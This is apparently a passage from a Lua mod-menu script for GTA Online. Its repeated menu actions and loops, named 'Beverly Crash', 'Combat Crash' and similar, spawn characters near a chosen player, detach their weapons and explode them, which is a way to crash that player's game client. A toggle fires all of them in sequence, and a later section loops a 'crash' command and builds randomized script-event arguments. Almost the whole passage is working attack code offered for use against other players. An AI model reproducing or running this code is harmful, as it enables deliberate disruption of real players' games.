            menu.action(oxtypecrashclick, "Beverly Crash", {"clickbeverlycrash"}, "", function()
            
            local mdl = util.joaat('cs_beverly')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 1, 0, 0), 0)
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.action(oxtypecrashclick, "Fabien Crash", {"clickfabiencrash"}, "", function()
            
            local mdl = util.joaat('cs_fabien')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 1), 0)
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.action(oxtypecrashclick, "Manuel Crash", {"clickmanuelcrash"}, "", function()
            
            local mdl = util.joaat('cs_manuel')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            
            menu.action(oxtypecrashclick, "Taostranslator Crash", {"clicktaostranslatorcrash"}, "", function()
            
            local mdl = util.joaat('cs_taostranslator')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Taostranslator2 Crash", {"clicktaostranslator2crash"}, "", function()
            
            local mdl = util.joaat('cs_taostranslator2')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 3), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Tenniscoach Crash", {"clicktenniscoachcrash"}, "", function()
            
            local mdl = util.joaat('cs_tenniscoach')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -1, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Wade Crash", {"clickwadecrash"}, "", function()
            
            local mdl = util.joaat('cs_wade')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -1, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Shop HIGH Crash", {"clickshophighcrash"}, "", function()
            
            local mdl = util.joaat('S_F_M_Shop_HIGH')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -1), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Franklin Crash", {"clickfranklincrash"}, "", function()
            
            local mdl = util.joaat('P_Franklin_02')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Lazlow Crash", {"clicklazlowcrash"}, "", function()
            
            local mdl = util.joaat('CS_Lazlow')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.action(oxtypecrashclick, "Siemon Crash", {"clicksiemoncrash"}, "", function()
            
            local mdl = util.joaat('IG_SiemonYetarian')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -3), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)

            local oxtypecrashtoggle = menu.list(oxtypecrash, "Ox Menu Type Crashes Toggled", {}, "From Nightfall")
            
            menu.toggle(oxtypecrashtoggle, "All Ox Menu Type Crashes", {"toggleoxallcrash"}, "Use Panic Mode If Needed.", function(on_toggle)
                if on_toggle then
                menu.trigger_commands("togglecombat" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("beverlycrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("fabiencrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("manuelcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("taostranslatorcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("taostranslator2crash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("tenniscoachcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("wadecrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("shophighcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("franklincrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("lazlowcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("siemoncrash" .. players.get_name(pid))
                util.yield(10)
            else
                menu.trigger_commands("togglecombat" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("beverlycrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("fabiencrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("manuelcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("taostranslatorcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("taostranslator2crash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("tenniscoachcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("wadecrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("shophighcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("franklincrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("lazlowcrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("siemoncrash" .. players.get_name(pid))
                util.yield(10)
                menu.trigger_commands("superc")
                util.yield(10)
                menu.trigger_commands("superc")
                            end
                      end)

                      
            menu.toggle_loop(oxtypecrashtoggle, "Combat Crash", {"togglecombat"}, "", function(on_toggle)
                
            local mdl = util.joaat('A_F_M_ProlHost_01')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_COMBATMG'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Beverly Crash", {"beverlycrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_beverly')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 1, 0, 0), 0)
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Fabien Crash", {"fabiencrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_fabien')
                if request_model(mdl, 2) then
                    local pos = players.get_position(pid)
                    util.yield(1)
                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 1), 0)
                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                    WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                    local obj
                    repeat
                        obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                    until obj ~= 0 or util.yield()
                    ENTITY.DETACH_ENTITY(obj, true, true) 
                    util.yield(1)
                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                    entities.delete_by_handle(ped1)
                    util.yield(1)
            else
                    util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Manuel Crash", {"manuelcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_manuel')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            
            menu.toggle_loop(oxtypecrashtoggle, "Taostranslator Crash", {"taostranslatorcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_taostranslator')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Taostranslator2 Crash", {"taostranslator2crash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_taostranslator2')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 3), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Tenniscoach Crash", {"tenniscoachcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_tenniscoach')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -1, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Wade Crash", {"wadecrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('cs_wade')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -1, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Shop HIGH Crash", {"shophighcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('S_F_M_Shop_HIGH')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -1), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Franklin Crash", {"franklincrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('P_Franklin_02')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Lazlow Crash", {"lazlowcrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('CS_Lazlow')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)
            
            menu.toggle_loop(oxtypecrashtoggle, "Siemon Crash", {"siemoncrash"}, "", function(on_toggle)
            
            local mdl = util.joaat('IG_SiemonYetarian')
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -3), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, true)
                entities.delete_by_handle(ped1)
                util.yield(1)
            else
                util.toast("Failed to load model. :/")
            --notification("Worth it HAHA!!!", colors.red)
            end
            
            end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local function random_args(id, amount)
    local args = {id}
    if not amount or amount == 0 then
        return args
    else
        for i = 2, amount + 1 do
            args[i] = math.random(-2147483647, 2147483647)
        end
        return args
    end
end


    	local standcrash = menu.list(crash, "Stand Crash Loops", {}, "")

	menu.divider(standcrash, "Stand Crash Loops")


        menu.toggle_loop(standcrash, "Elegant", {"togglecrash"}, "Blocked by most menus.", function()
            --notification("Elegant sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("crash" .. players.get_name(pid))
            util.yield(1000)
        end)

        menu.toggle_loop(standcrash, "BDSM", {"togglechoke"}, "Blocked by popular menus.", function(on_loop)
